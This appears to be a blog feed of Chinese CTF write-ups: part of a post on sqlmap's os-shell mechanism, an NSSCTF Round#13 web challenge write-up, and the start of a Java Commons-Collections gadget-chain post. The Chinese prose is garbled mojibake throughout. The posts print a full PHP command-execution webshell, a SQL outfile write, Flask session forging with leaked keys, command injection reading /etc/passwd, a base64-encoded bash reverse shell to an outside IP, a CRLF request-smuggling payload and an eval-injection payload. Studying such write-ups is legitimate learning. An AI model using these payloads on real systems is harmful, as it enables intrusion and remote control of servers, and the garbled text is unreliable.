class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/test.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;Y0n3er&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049896.png" alt="image-20230616204911858"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049822.png" alt="image-20230616204920783"><br>ÊàêÂäüÂÜôÂÖ•ËøõÂéªÔºåÁªìÂêà‰∏äÈù¢ÁöÑ‰ª£Á†ÅÂàÜÊûêÔºåÂÖ∂ÂÆûËøô‰∏™ÂëΩ‰ª§Â∞±ÊòØÂÜô‰∏Ä‰∏™Áî®‰∫éÊñá‰ª∂‰∏ä‰º†ÁöÑË°®Âçï<code>tmpuqmdh.php</code>Êñá‰ª∂ÔºåÁªßÁª≠ÂàÜÊûêÔºåÊâæÂà∞‰∫Ü35Ëøô‰∏™Êï∞ÊçÆÂåÖÔºåÈáåÈù¢ÈÄöËøápostËÆøÈóÆ‰∏ä‰º†‰∫Ü‰∏Ä‰∏™<code>tmpbkdyk.php</code>Êñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049628.png" alt="image-20230616204929561"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$c</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];  </span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);  </span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="number">0</span>);  </span><br><span class="line"><span class="variable">$z</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$z</span>)) &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$z</span>);  </span><br><span class="line">    <span class="variable">$z</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$z</span> = <span class="keyword">array</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>, <span class="variable">$z</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$y</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), <span class="variable">$t</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>])) &#123;  </span><br><span class="line">        <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>], <span class="number">512</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>)) &#123;  </span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();  </span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">ob_get_clean</span>();  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, r);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>)) &#123;  </span><br><span class="line">            <span class="variable">$w</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>, <span class="number">512</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);  </span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>)) &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">array</span>();  </span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$w</span>);  </span><br><span class="line">    <span class="variable">$w</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$w</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="variable">$w</span> = <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ËøôÊÆµ‰ª£Á†ÅÂ§ßÊ¶ÇÂ∞±ÊòØÂëΩ‰ª§ÊâßË°åÔºåÁÑ∂ÂêéËæìÂá∫ÁªìÊûúÔºåËá≥Ê≠§Êï¥‰∏™ËøáÁ®ãÂ∞±Â∑Æ‰∏çÂ§öÁªìÊùü‰∫ÜÔºåÂèØ‰ª•ÁúãÂà∞ÁõÆÂΩï‰∏ãÂ≠òÂú®Âá†‰∏™ÂêéÈó®Êñá‰ª∂ÔºåËøôÈáåÊúâ‰∏§‰∏™Êñá‰ª∂‰∏ä‰º†Ë°®Âçï‰ª£Á†ÅÔºåÂ∫îËØ•ÊòØÊàëÂ§öÊâßË°å‰∫Ü‰∏ÄÊ¨°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162049508.png" alt="image-20230616204942475"></p><h2 id="ÈôêÂà∂Êù°‰ª∂"><a href="#ÈôêÂà∂Êù°‰ª∂" class="headerlink" title="ÈôêÂà∂Êù°‰ª∂"></a>ÈôêÂà∂Êù°‰ª∂</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">‰∏â‰∏™Êù°‰ª∂Ôºö</span><br><span class="line">1.ÂÖ∑ÊúârootÊùÉÈôê„ÄÇ</span><br><span class="line">2.Âú®Êï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑ ÈÖçÁΩÆÈ°πÂê´ÊúâÔºösecure_file_priv=&#x27;&#x27;„ÄÇÔºàÊ≥®ÊÑèÂú®Êï∞ÊçÆÂ∫ì‰∏≠Ê≠§È°πÈªòËÆ§‰∏∫secure_file_priv=nullÔºâ„ÄÇ</span><br><span class="line">3.Áü•ÈÅìÊï∞ÊçÆÂ∫ìÁöÑÁªùÂØπË∑ØÂæÑ„ÄÇ</span><br></pre></td></tr></table></figure><p>ÂÖ∂ÂÆûÂ∞±ÊòØÈÇ£‰∏™ÂÜôÂÖ•Êù°‰ª∂ÔºåÂè¶Â§ñphp‰∏ªÂä®ËΩ¨‰πâÂæóÂÖ≥Èó≠ÔºåGPC‰∏∫offÔºå‰ΩÜÊòØGPCËøô‰∏™Âú®ÂêéÈù¢ÁöÑphpÁâàÊú¨ÈÉΩÂà†Èô§‰∫ÜÁî®Êà∑ÂèØ‰ª•Ëá™Â∑±ÊéßÂà∂ÔºåÂç≥<code>magic_quotes_gpc</code>Ëøô‰∏™ÈÄâÈ°πÔºåÊâÄ‰ª•‰πüÂ∞±‰∏äÈù¢‰∏â‰∏™Êù°‰ª∂</p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>ÂàÜÊûê‰∏ÄÈÅçÂèëÁé∞ÂéüÁêÜ‰∏çÊòØÂæàÈöæÔºå ‰ΩÜÊòØËøô‰∏™Âà©Áî®Ëµ∑Êù•ÂæàÈöæÔºåË¶ÅÊ±ÇÂ§™È´ò‰∫Ü</p><p>ÂèÇËÄÉÔºö</p><p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">sqlmap ‚Äìos-shell ÂéüÁêÜËØ¶Ëß£_os‚Äìshell_ZredamanJÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFRound#13 Web</title>
      <link href="/2023/06/NSSCTFRound-13-Web/"/>
      <url>/2023/06/NSSCTFRound-13-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="‰∏ÄÁÇπÊÑüÂèπ"><a href="#‰∏ÄÁÇπÊÑüÂèπ" class="headerlink" title="‰∏ÄÁÇπÊÑüÂèπ"></a>‰∏ÄÁÇπÊÑüÂèπ</h2><p>ÊúÄËøëÂæàÁÉ¶ÔºåÊØîËµõÂæàÁÆÄÂçïÁöÑÈ¢ò‰πüÂÅö‰∏çÂá∫Êù•Â§©Â§©ÁàÜ0Ôºå‰º∞ËÆ°ÊòØÂü∫Á°ÄÊ≤°ÊâìÁâ¢ÂêßÔºåÈáçÊñ∞ÂõûÂéªÂà∑Âü∫Á°ÄÈ¢ò</p><h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>Ê≥®ÂÜåË¥¶Âè∑ÂèëÁé∞adminÂ∑≤ÁªèÂ≠òÂú®ÔºåÁÑ∂ÂêéÈöè‰æøÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑ÂèëÁé∞adminÊâçËÉΩgetFlagÔºåÂ∞±ÊòØ‰º™ÈÄ†session‰∫Ü<br>Âú®ÂøòËÆ∞ÂØÜÁ†ÅÂèëÈÄÅÈÇÆ‰ª∂ÈÇ£ÈáåÊäìÂåÖÊâæÂà∞key<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042149273.png" alt="image-20230604214829222"><br>ÁÑ∂ÂêéÂ∞±ÊòØ‰º™ÈÄ†session‰∫Ü</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s th3f1askisfunny -c <span class="string">&quot;session&quot;</span></span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s th3f1askisfunny -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁî®Ëøô‰∏™sessionÂéªgetFlagÂç≥ÂèØ</p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>ÁÇπÂáªToolÂèëÁé∞Â∞Ü114514ÂàÜËß£‰∫ÜÔºå‰ΩøÁî®<code>%0a</code>Êà™Êñ≠Â∞ÜÂâçÈù¢ÁöÑÂëΩ‰ª§Êà™Êñ≠ÂêéÈù¢ÊãºÊé•Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0acat%20%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure><p>ËøôÈáå<code>/</code>‰πüË¶ÅËøõË°åurlÁºñÁ†ÅÔºå‰∏çÁÑ∂‰ºöË¢´ÂΩìÂÅöÊñá‰ª∂ÁõÆÂΩïÔºåÊâßË°åÊàêÂäüÔºå‰ΩÜÊòØ<code>cat /flag</code>Âá∫Áé∞‰∏ÄÂ†ÜÊï∞Â≠óËØªÂá∫Êù•‰∏çÂ•ΩËØªÁõ¥Êé•ÂèçÂºπshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28718/factors/114514%0aecho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDMuOTkuMTYwLzY2NjYgMD4mMQ==|base64 -d|bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150726.png" alt="image-20230604215000673"></p><h2 id="‰ø°ÊÅØÊî∂ÈõÜ"><a href="#‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="‰ø°ÊÅØÊî∂ÈõÜ"></a>‰ø°ÊÅØÊî∂ÈõÜ</h2><p>Êäì‰∏™ÂåÖÂèëÁé∞Êúâ‰∏™Apache&#x2F;2.4.55webÊúçÂä°Âô®ÔºåËøô‰∏™ÁâàÊú¨Êúâ‰∏™CVEÔºåÂèÇËÄÉ<a href="https://xz.aliyun.com/t/12345#toc-7">CVE-2023-25690 Apache HTTP Server ËØ∑Ê±ÇËµ∞ÁßÅÊºèÊ¥û ÂàÜÊûê‰∏éÂà©Áî® - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a><br>ÁÑ∂ÂêéÊàë‰ª¨ËØªÂèñindex.phpÂèëÁé∞Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéËØªÂèñ<code>/usr/local/apache2/conf/httpd.conf</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150738.png" alt="image-20230604215016705"><br>ËøôÈáåÂØπ<code>/nssctf/</code>ÂÅö‰∫Ü‰∏™‰ª£ÁêÜËΩ¨ÂèëÔºåÁåúÊµãÂú®ËΩ¨ÂèëÂêéÁöÑÊú∫Âô®‰∏äÔºåÂà©Áî®crlfÊºèÊ¥ûÂéªËØªÂèñflagÔºåËøô‰∏™payloadÁõ∏ÂΩì‰∫éÂéªËØ∑Ê±ÇËΩ¨ÂèëÂêéÁöÑÊú∫Âô®‰∏äÁöÑÊñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nssctf/0%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150023.png" alt="image-20230604215035976"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// ÂÜô‰∫Ü‰∏™ÁΩëÈ°µÂ≠òÂÇ®JSONÊï∞ÊçÆÔºå‰ΩÜÊòØËøò‰∏ç‰ºöÂ§ÑÁêÜjsonÊ†ºÂºèÔºåËøôÊ†∑Â§ÑÁêÜÂ∫îËØ•Ê≤°Êúâ‰ªÄ‰πàÈóÆÈ¢òÂêß</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Â§çÁé∞ÁéØÂ¢ÉÂá∫‰∫ÜÈóÆÈ¢òÔºåÂÖ∂ÂÆûËøô‰∏™È¢òÂ∞±ÊòØÊääÂéüÊù•ÁöÑÊï∞ÊçÆÁªôÈó≠ÂêàÊéâÂ∞±ËÉΩÂëΩ‰ª§ÊâßË°å‰∫ÜÔºåÁåúÊµãÂÆÉÂÇ®Â≠òÁöÑjsonÊï∞ÊçÆÊ†ºÂºè‰∏∫<code>[1,2,3,‚Ä¶‚Ä¶]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?mode=save&amp;value=];%0aecho cat /flag;%0a[</span><br><span class="line">?mode=read</span><br></pre></td></tr></table></figure><p>ÊñπÂºè‰∏çÊ≠¢Ëøô‰∏Ä‰∏™Âõ†‰∏∫ÁéØÂ¢ÉÈóÆÈ¢ò‰πüÊ≤°Âéª‰∏Ä‰∏™‰∏™È™åËØÅ‰∫Ü</p><h2 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>ÁôªÂΩïÂêéÊ∫êÁ†Å‰∏≠Áªô‰∫Ü‰∏Ä‰∏™&#x2F;worË∑ØÁî±ÔºåËÆøÈóÆÂèëÁé∞Ê≤°Âï•‰∏úË•øÔºåÁÑ∂ÂêéÊääsessionÈöè‰æøÂà†Èô§ÁÇπ‰∏úË•øÈ°µÈù¢Êä•ÈîôÔºåÂºÄÂêØ‰∫ÜdebugÂú®Ê∫êÁ†Å‰∏≠ÊâæÂà∞key <code>hardgam3_C0u1d_u_f1ndM3????&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150428.png" alt="image-20230604215051392"><br>Êé•‰∏ãÊù•Â∞±ÂíåÂâçÈù¢‰∏ÄÊ†∑‰º™ÈÄ†sessionÂ∞±Ë°å‰∫Ü</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s hardgam3_C0u1d_u_f1ndM3???? -c &quot;session&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s hardgam3_C0u1d_u_f1ndM3???? -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line">//‰º™ÈÄ†ÁöÑÊó∂ÂÄôÊäätimeÂà†Èô§Ôºå‰∏çÁÑ∂‰ºöÊä•Èîô</span><br></pre></td></tr></table></figure><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p>0Ëß£È¢òÔºåÁúã‰∫ÜwpÊúâÁÇπÈöæÔºå‰∏çÊÉ≥Â§çÁé∞‰∫Ü<br>wpÔºö<a href="https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/">https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/</a></p><p>ÂèÇËÄÉÔºö<br><a href="https://www.cnblogs.com/F12-blog/p/17455819.html">NSSCTF Round#13 web‰∏ìÈ°π - F12~ - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</a><br><a href="https://ph0ebus.cn/post/NSSRound13%20WEB.html#ez_factors">NSSCTFRound#13 Web ¬∑ ph0ebus‚Äôs Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ3</title>
      <link href="/2023/06/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE3/"/>
      <url>/2023/06/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE3/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÂáÜÂ§á"><a href="#ÁéØÂ¢ÉÂáÜÂ§á" class="headerlink" title="ÁéØÂ¢ÉÂáÜÂ§á"></a>ÁéØÂ¢ÉÂáÜÂ§á</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÊúÄËøëÂá†Âë®Ê≤°Á¢∞JavaÊÑüËßâÂèàÊúâÁÇπÁîüÁñè‰∫ÜÔºåÂú®CC3‰∏≠ÂëΩ‰ª§ÊâßË°åÁöÑÊñπÊ≥ïÂíå1Ôºå6‰∏ç‰∏ÄÊ†∑ÔºåËøôÈáåÁî®ÁöÑÊòØÂä®ÊÄÅÁ±ªÂä†ËΩΩÔºå‰ΩøÁî®<code>defineClass-&gt;newInstance</code> Êù•ÂëΩ‰ª§ÊâßË°åÂç≥Âú®Â≠óËäÇÈáåÈù¢Âä†ËΩΩ‰∏Ä‰∏™Á±ªÁÑ∂ÂêéÂÆû‰æãÂåñÊâßË°å‰ª£Á†ÅÔºåÊâÄ‰ª•Áõ¥Êé•‰ªéËøôÈáåÂÖ•ÊâãÈÄÜÊé®ÔºåËøòÊòØfind usagesÂØªÊâæÂì™ÈáåË∞ÉÁî®‰∫ÜdefineClassÔºåÂõ†‰∏∫ÂÆÉÊòØ‰∏Ä‰∏™protectedÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™Ë∞ÉÁî®ÂÆÉpublicÊñπÊ≥ïÔºåÊúÄÁªàÂú®TemplatesImplÁ±ªÁöÑ<code>static final class TransletClassLoader</code>‰∏ãÊâæÂà∞defineClassËøôÈáåÊ≤°ÊúâÊ†áÊ≥®‰ΩúÁî®ÂüüÂç≥ÈªòËÆ§‰∏∫defalutÔºå‰πüÂ∞±ÊòØËá™Â∑±ÁöÑÁ±ªÈáåÈù¢ÂèØ‰ª•Ë∞ÉÁî®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733679.png" alt="image-20230603173329428"><br>ÁªßÁª≠find usagesÂèëÁé∞defineTransletClassesÁßÅÊúâÊñπÊ≥ïÈáåÈù¢Ë∞ÉÁî®‰∫Ü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733726.png" alt="image-20230603173354505"><br>ËøôÈáå<code>_bytecodes</code>‰∏çËÉΩ‰∏∫Á©∫‰∏çÁÑ∂Â∞±‰∏çËÉΩÊâßË°åÂà∞defineClassÊñπÊ≥ï‰∫ÜÔºåÁÑ∂ÂêéÁªßÁª≠find usagesÊúÄÁªàÊâæÂà∞‰∫ÜgetTransletInstanceÊñπÊ≥ïÂπ∂‰∏îËøôÈáåÊúâ‰∏™<code>newInstance()</code>ÂÆû‰æãÂåñÁöÑËøáÁ®ãÔºåÂä®ÊÄÅÊâßË°å‰ª£Á†ÅÊ≠£Â•ΩÈúÄË¶ÅÂÆû‰æãÂåñÔºåÊâÄ‰ª•Â¶ÇÊûúËµ∞ÂÆåËøô‰∏™ÂáΩÊï∞Â∞±Áõ∏ÂΩì‰∫éÁªìÊùü‰∫ÜÔºå‰ΩÜÊòØËøô‰∏™getTransletInstanceÊñπÊ≥ïÊòØÁßÅÊúâÔºåÊâÄ‰ª•ËøòÂæóÁªßÁª≠ÊâæÔºåÊúÄÁªàÊâæÂà∞‰∫ÜnewTransformerÊñπÊ≥ïÔºåÈáåÈù¢Ë∞ÉÁî®‰∫ÜgetTransletInstanceÊñπÊ≥ïÔºåÂπ∂‰∏înewTransformerÊñπÊ≥ïÊòØpublicÔºåÊé•‰∏ãÊù•Â∞±ÊòØÂà©Áî®‰∫Ü<br><img 